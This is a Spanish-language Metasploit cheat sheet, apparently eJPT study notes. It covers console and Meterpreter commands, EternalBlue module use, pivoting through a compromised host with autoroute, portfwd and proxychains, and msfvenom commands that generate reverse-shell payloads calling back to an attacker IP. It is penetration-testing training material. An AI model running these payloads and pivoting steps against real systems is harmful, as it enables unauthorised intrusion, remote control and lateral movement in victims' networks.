# Metasploit

# Arquitectura de Metasploit

- **Exploit**: Módulo para explotar una vulnerabilidad. Usualmente se empareja con un payload.
- **Payload**: El código que se usa *después* de explotar una vulnerabilidad para entregar un shell o un sistema de comando y control (C2).
- **Encoders** (Codificadores): Se usan para codificar payloads y así evitar la detección de Antivirus (AV).
- **NOPS**: Aseguran la estabilidad y consistencia de un payload.
- **Auxiliary** (Auxiliares): Módulos que realizan funciones adicionales, como escaneo de puertos, fuzzing y enumeración.

---

# Tipos de Payloads

- **Sin Fases (Non-Staged)**: El payload se envía en una sola parte.
- **Por Fases (Staged)**: La entrega del payload se hace en dos fases:
    1. El primer payload (`stager`) establece una conexión inversa.
    2. El segundo payload (`stage`) es descargado por el *stager* y luego ejecutado.

---

# Metasploit en las fases en Pentesting

| **Fase de Pentesting** | **Módulos de Metasploit** |
| --- | --- |
| Information Gathering | Módulos auxiliary |
| Vulnerability Scanning | Módulos Auxiliares |
| Exploitation | Módulos Exploit & Payloads |
| Post Exploitation | Meterpreter |
| Privilege Escalation | Post-Explotación & Meterpreter |
| Persistence | Post-Explotación & Persistencia |

---

# Guía de Uso

## Inicialización Metasploit

- `service postgresql start`  Siempre deberemos inicializar la base de datos antes de arrancar metasploit
- `msfdb init` Inicializar bd (Sólo si es la primera vez)
- `msfconsole` Iniciar la consola de comando de metasploit

---

## Gestión del espacio de trabajo (Workspace)

- `workspace -a lab_ejpt`   # Crear un espacio nuevo
- `workspace`               # Listar espacios
- `workspace default`       # Cambiar de espacio

---

## Comandos básicos

## Pre-explotación

| **Comando** | **Descripción** | **Ejemplo** |
| --- | --- | --- |
| `workspace -a "nombre_workspace"` | Creación workspace | `workspace -a SMTP` |
| `setg "var" "valor_var"` | Establecer variable global | `setg RHOSTS target.ine.local` |
| `search type: "tipo_ataque" name:"tecnologia_o_vulnerabilidad"` | Buscar exploit o módulo | `search type:auxiliarity name:smtp` |
| `use "ruta_del_modulo"` | Selección de módulo | `use exploit/windows/smb/ms17_010_eternalblue` |
| `show options` | Ver que opciones necesita el módulo |  |
| `info` | Muestra información del módulo seleccionado |  |
- Configurar lo que requiera el comando `show options` ). Ej.:
    1. `set RHOST <IP_VICTIMA>` IP a la que atacar
    2. `set LHOST <TU_IP>` Nuestra IP de atacante
    3. `set PAYLOAD <ruta_payload>` Que shell quieres
- `exploit` Lanzar ataque
- `shell` Comanezar una sesión de comandos (si conseguimos explotarlo)
- Comandos útiles:
    - `back` Volver al menú principal
    - `info` Información detallada del módulo seleccionado
    - `sessions -l` Listar sesiones activas
    - `sessions -i <N>` Acceder a una sesión

## Post-Explotación

---

### Archivos de interés

| **Descripción** | **Ruta del archivo** |
| --- | --- |
| Nombres de usuarios | `/usr/share/metasploit-framework/data/wordlists/common_users.txt` |
| Listado de contraseñas | `/usr/share/metasploit-framework/data/wordlists/common_passwords.txt` |
| Listado de contraseñas UNIX | `/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt` |
| Directorios | `/usr/share/metasploit-framework/data/wordlists/directory.txt` |

---

## **Meterpreter**

Una vez que el exploit tiene éxito, a menudo te da una "sesión de Meterpreter". Esta es una shell con superpoderes.

- `help`    #Comando para listar toodos los comandos divididos por tipo

### Enumeración Básica

- `sysinfo`        # Ver info del SO, arquitectura (x64/x86), etc.
- `getuid`          # Ver qué usuario eres (ej. www-data, root)
- `ifconfig`      # Ver las IPs y redes de la víctima (¡CLAVE PARA PIVOTING!)
- `ps`                 # Ver procesos en ejecución

### Sistema de Archivos

- `l"comando"`    # Usado para aplicar el comando en local “Ej: lls”
- `ls`                   # Listar archivos (en la víctima)ç
- `d <dir>`       # Moverse de directorio (en la víctima
- `pwd`                 # Ver directorio actual (en la víctima)
- `download <archivo_remoto> <ruta_local>` # Descargar archivo
- `upload <archivo_local> <ruta_remota>`     # Subir archivo
- `cat <archivo>`  # Leer un archivo
- `edit <archivo>`  #Editar un archivo

### Gestión de la Sesión

- `background`     # Manda la sesión a segundo plano (¡para hacer pivoting!)
- `sessions -l`  # Listar sesiones activas
- `exit`                # Cierra la sesión

### Post-Explotación

---

# Pivoting

## Escenario

Tienes la **Víctima A (10.10.0.50)** y descubres que tiene otra tarjeta
de red conectada a una red interna **(172.16.5.0/24)** donde está la
**Víctima B**.

Averiguar redes conectadas desde sesión activa:

- `ipconfig`

## 🥇 Paso 1: Autoroute y PortForwarding

## AutoRoute

Permite que los módulos de Metasploit “vean” la red interna a través de
la Víctima A.

1. Obtén sesión en la Víctima A y ejecuta `background`.
2. Añade la ruta:

```bash
use post/multi/manage/autoroute
set SESSION <ID_SESION_VICTIMA_A>
run
```

1. Verifica la ruta:

```bash
run autoroute -p
```

## PortForwarding

Lo primero de todo será escanear tras el autoroute al host víctima con `use auxiliary/scanner/portscan/tcp`

Luego por cada servicio que haya levantado (En la meterpreter):

- `portfwd add -l 1080 -p 80 -r <IP víctima>` # Importante indicar la Ip y no dns
- `portfwd list`  # Para validar que puertos están redireccionados

Con esto ya podríamos escanear los puertos de la víctima en nuestro `localhost`

---

## 🥈 Paso 2: Atacar la red interna

Con la ruta añadida, puedes lanzar exploits directamente a máquinas
internas como:

- Atacar a **172.16.5.20** con EternalBlue desde tu propio Metasploit.
- Escaneo de puertos con `use auxiliary/scanner/portscan/tcp`

---

## 🥉 Paso 3: Proxychains (Herramientas Externas)

Sirve para usar herramientas externas como **Nmap**, **Hydra**, etc.
contra la red interna pivoteando desde la víctima.

### 1. Activar servidor SOCKS en Metasploit

```bash
use auxiliary/server/socks_proxy
set SRVPORT 9050
run
```

### 2. Configurar Proxychains en Linux

Editar configuración:

```bash
sudo nano /etc/proxychains4.conf
```

Añadir al final:

```
socks5 127.0.0.1 9050
```

### 3. Usar herramientas externas con Proxychains

```bash
proxychains nmap -sT -Pn -n 172.16.5.20
```

---

# 🧪 ReverseShells MSFVenom

| Sistema | Formato | Comando |
| --- | --- | --- |
| **Linux** | ELF | `msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<P> -f elf -o shell.elf` |
| **Windows** | EXE | `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<P> -f exe -o shell.exe` |
| **Web** | PHP | `msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<P> -f raw -o shell.php` |
| **Web** | ASPX | `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<P> -f aspx -o shell.aspx` |

Luego de subir

---

# 📂 Archivos de Interés (Wordlists)

- **Usuarios:**`/usr/share/metasploit-framework/data/wordlists/common_users.txt`
- **Contraseñas:**`/usr/share/metasploit-framework/data/wordlists/common_passwords.txt`
- **Directorios:**`/usr/share/metasploit-framework/data/wordlists/directory.txt`